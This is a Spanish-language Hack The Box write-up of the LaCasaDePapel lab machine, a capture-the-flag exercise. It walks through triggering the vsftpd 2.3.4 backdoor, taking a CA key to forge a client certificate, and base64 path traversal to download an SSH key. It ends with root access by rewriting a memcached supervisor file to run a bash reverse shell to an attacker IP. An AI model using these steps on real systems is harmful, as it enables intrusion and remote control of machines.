---
layout: single
title: La Casa de Papel - Hack The Box
excerpt: "Tocamos certificados ssl"
date: 2024-12-01
classes: wide
header:
  teaser: /assets/images/htb-valentine/valentine1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - openssl
  - LFI
  - weak permissions 
---

# 10.10.10.131 - LaCasaDePapel
![](/assets/images/htb-casapapel/la_casa_de_papel0.png)

--------------------------
# Reconocimiento inicial

Primero lanzamos Nmap
```bash
$: nmap -sCV 10.10.10.131 -p 21,22,80,443
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-11 14:41 CET
Nmap scan report for 10.10.10.131
Host is up (0.035s latency).

PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
|_http-title: La Casa De Papel
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
```

Vemos tanto `ssh`, `ftp`, `http` y `https`. A pesar de ver una versión vulnerable muy conocida (`vsftpd 2.3.4`), Primero hacemos cierto 
reconocimiento sobre las webs. 
```bash
$: whatweb http://10.10.10.131:80
http://10.10.10.131:80 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.131], Title[La Casa De Papel], X-Powered-By[Express]

$: whatweb https://10.10.10.131:443
https://10.10.10.131:443 [401 Unauthorized] Country[RESERVED][ZZ], HTML5, IP[10.10.10.131], Title[La Casa De Papel], X-Powered-By[Express]

$: curl -sv https://10.10.10.131:443 -k
* Server certificate:
*  subject: CN=lacasadepapel.htb; O=La Casa De Papel
(...)
< HTTP/1.1 401 Unauthorized
< X-Powered-By: Express
(...)
<!DOCTYPE html><html lang="en"><head><title>La Casa De Papel</title><style type="text/css">body {
(...)
```
- En la web de http encontramos un códigoQr que parece un rabbit hole, porque probando cosas no he dado con nada interesante. 
![](/assets/images/htb-casapapel/la_casa_de_papel3.png)
- En https nos salta un error de que falta un certificado
![](/assets/images/htb-casapapel/la_casa_de_papel2.png)

Haciendo fuzzing con wfuzz no encontramos ninguna ruta interesante
```bash
$: wfuzz --hc=404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb" http://lacasadepapel.htb/
(...)
$: wfuzz --hc=404 --hh=1754 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb" http://lacasadepapel.htb/
(...)
$: wfuzz --hc=404,401 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.lacasadepapel.htb"https://lacasadepapel.htb:443
(...)
```

--------------------------
# PHP Shell

Volvemos con `vsftpd 2.3.4` en el puerto 21, procedemos a explotarla manualmente. 
1. Mandamos una carita sonriente en el nombre `USER cucusxii:)`  
2. Escuchamos por el puerto 6200  
```bash
$: nc -nv 10.10.10.131 21
(UNKNOWN) [10.10.10.131] 21 (ftp) open
220 (vsFTPd 2.3.4)
USER cucuxii:)
331 Please specify the password.
PASS :)

$: nc -nv 10.10.10.131 6200
(UNKNOWN) [10.10.10.131] 6200 (?) open
Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
```

Tenemos una extraña shell de PHP, donde podemos mandar comandos
```php
ls
Variables: $tokyo

dump $tokyo
Tokyo {#2307}

echo $tokyo;
PHP Recoverable fatal error:  Object of class Tokyo could not be converted to string in phar://eval() decode on line 1

show $tokyo
  > 2| class Tokyo {
    3| 	private function sign($caCert,$userCsr) {
    4| 		$caKey = file_get_contents('/home/nairobi/ca.key');
    5| 		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
    6| 		openssl_x509_export($userCert, $userCertOut);
    7| 		return $userCertOut;
    8| 	}
    9| }
```

En este código estan mostrando que crean un certificado x509 con el archivo `/home/nairobi/ca.key`
Podemos correr ciertos comandos propios de php (al igual que hacer `php --interactive`), pero no es tal cosa ya que por ejemplo no necesitamos
`print_r` para comandos como `scandir`
```php
echo 3 + 3;
6⏎

system("whoami");
PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1

phpinfo()
PHP Version => 7.2.10
disable_functions => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source => exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

print_r(scandir("/home");
PHP Parse error: Syntax error, unexpected ';', expecting ')' on line 1
```

Seguimos probando cosas, por ejemplo mirar `/home/nairobi/ca.key`
```php
scandir("/home");
=> [ ".", "..", "berlin", "dali", "nairobi", "oslo", "professor", ]

file_get_contents("/home/nairobi/ca.key");
=> """
   -----BEGIN PRIVATE KEY-----\n
   MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb\n
   7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/\n
   ...
   53udBEzjt3WPqYGkkDknVhjD\n
   -----END PRIVATE KEY-----\n
   """
```
--------------------------
# Certificado ssl

Nos copiamos esa `ca.key` para utilizarla mas adelante. Tambien podemos ver que hay ciertos archivos
```bash
scandir("/home/berlin/downloads");
=> [ ".", "..", "SEASON-1", "SEASON-2", "Select a season", ]

scandir("/home/berlin/downloads/SEASON-1");
=> [".", "..", "01.avi", "02.avi", "03.avi", "04.avi",... 

scandir("/home/berlin/.ssh");
PHP Warning:  scandir(/home/berlin/.ssh): failed to open dir: Permission denied in phar://eval()'d code on line 1
```

Tenemos la `ca.key`, pero necesitamos un archivo `.pem` de tipo `x509` válido... ¿De dónde lo sacamos? Del propio certificado
```bash
$: openssl s_client --connect lacasadepapel.htb:443
...
Server certificate
-----BEGIN CERTIFICATE-----
MIIC6jCCAdICCQDISiE8M6B29jANBgkqhkiG9w0BAQsFADA3MRowGAYDVQQDDBFs
YWNhc2FkZXBhcGVsLmh0YjEZMBcGA1UECgwQTGEgQ2FzYSBEZSBQYXBlbDAeFw0x
OTAxMjcwODM1MzBaFw0yOTAxMjQwODM1MzBaMDcxGjAYBgNVBAMMEWxhY2FzYWRl
...
```
Creamos así el certificado `pkcs12`
```
$: openssl pkcs12 -export -in cert.pem -inkey ca.key -out hackthebox.pkcs12
Enter Export Password:
Verifying - Enter Export Password:
```

Si importamos tanto la `ca.key` como el certificado `hackthebox.pkcs12`, podemos acceder a la web del puerto 443.
![](/assets/images/htb-casapapel/la_casa_de_papel4.png)
![](/assets/images/htb-casapapel/la_casa_de_papel5.png)
![](/assets/images/htb-casapapel/la_casa_de_papel6.png)

Esta nos muestra una serie de archivos, los capitulos de las dos temporadas en video (vacíos obviamnete, pero la máquina parece imitar 
entonces un portal pirata). 
![](/assets/images/htb-casapapel/la_casa_de_papel7.png)

- Tenemos el parámetro `?path=SEASON-1`, que lista directorios, sabemos que la ruta completa es `/home/berlin/downloads/SEASON-1`, tambien que este usuario tiene una llave privada a la que no podíamos acceder. Pero el parametro es para directorios solo, no archivos, 
![](/assets/images/htb-casapapel/la_casa_de_papel8.png)

Si ponemos `../.ssh` salen los archivos, pero no podemos descargarlos
![](/assets/images/htb-casapapel/la_casa_de_papel9.png)
- Al descargar los archivos de video, vemos que hace una petición `GET` a `/file` mas una cadena de caracteres que parece base64, en efecto, así es
![](/assets/images/htb-casapapel/la_casa_de_papel10.png)
```bash
$: echo "U0VBU09OLTEvMDIuYXZp" | base64 -d
SEASON-1/02.avi
```

Así que hacemos lo mismo para hacernos con la llave privada
```bash
$: echo -n "../.ssh/id_rsa" | base64 -w0
Li4vLnNzaC9pZF9yc2E= 
```

Intentamos acceder a `berlin` pero no nos lo permite
```bash
$: ssh -i id_rsa berlin@10.10.10.131
berlin@10.10.10.131's password:
```

--------------------------
# Escalada de privilegios

Pero tenemos mas usuarios, se intenta uno a uno hasta que
```bash
$: ssh -i id_rsa professor@10.10.10.131

 _             ____                  ____         ____                  _
| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
                                                            |_|

lacasadepapel [~]$ echo $SHELL
/bin/ash
```

Si subo [mi script de reconocimiento](https://github.com/jessica-diaz-ciber/Pentesting-tools/blob/main/lin_info.sh) y lo ejecuto:
```bash
  >  Carpetas home de los diferentes usuarios
berlin >
lrwxrwxrwx  1 berlin berlin    9 Nov  6  2018 .ash_history -> /dev/null
drwx------  2 berlin berlin 4096 Jan 31  2019 .ssh
...
professor >
lrwxrwxrwx 1 root      professor    9 Nov  6  2018 .ash_history -> /dev/null
drwx------ 2 professor professor 4096 Jan 31  2019 .ssh
-rw-r--r-- 1 root      root        88 Jan 29  2019 memcached.ini
-rw-r----- 1 root      nobody     434 Jan 29  2019 memcached.js
drwxr-sr-x 9 root      professor 4096 Oct  3  2022 node_modules

           PROCESOS   

PID   USER     TIME  COMMAND
...
 3129 root      0:02 /usr/bin/vmtoolsd
 3159 memcache  0:00 /usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid
```
Al encontrado varias cosas relacionadas con `memecached`, debemos suponer que la escalada tiene que ver con eso.
El usuario `professor` tiene dos archivos relacionados con el memcached, pertenecientes a root.

```bash
lacasadepapel [~]$ ls /home/professor
memcached.ini  memcached.js  node_modules

lacasadepapel [~]$ ps faux | grep -vE "accountsservice|firefox|VBox|]|libexec|systemd|wpa_supplicant|containerd|NetworkManager|gunicorn"
 3151 memcache  0:25 /usr/bin/memcached -d -p 11211 -U 11211 -l 127.0.0.1 -m 64 -c 1024 -u memcached -P /var/run/memcached/memcached-11211.pid

lacasadepapel [~]$ ls -l
-rw-r--r-- 1 root root        88 Jan 29  2019 memcached.ini
-rw-r----- 1 root nobody     434 Jan 29  2019 memcached.js
drwxr-sr-x 9 root professor 4096 Oct  3  2022 node_modules

lacasadepapel [~]$ echo -e "test" > memcached.ini
-ash: cant create memcached.ini: Permission denied
```

No podemos editar directamente el archivo `memechached.ini` porque no tenemos permisos, pero si podemos editarlo de otra manera
```bash
lacasadepapel [~]$ mv memcached.ini /tmp/

lacasadepapel [~]$ ls
memcached.js  node_modules

lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'" > memcached.ini
```
Esperamos un poco y recibimos una shell

```bash
$: sudo nc -nlvp 443
[sudo] password for jessica:
listening on [any] 443 ...
iconnect to [10.10.14.22] from (UNKNOWN) [10.10.10.131] 55656
bash:cannot set terminal process group (31342): Not a tty
bash: no job control in this shell
bash-4.4# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
bash-4.4#
```
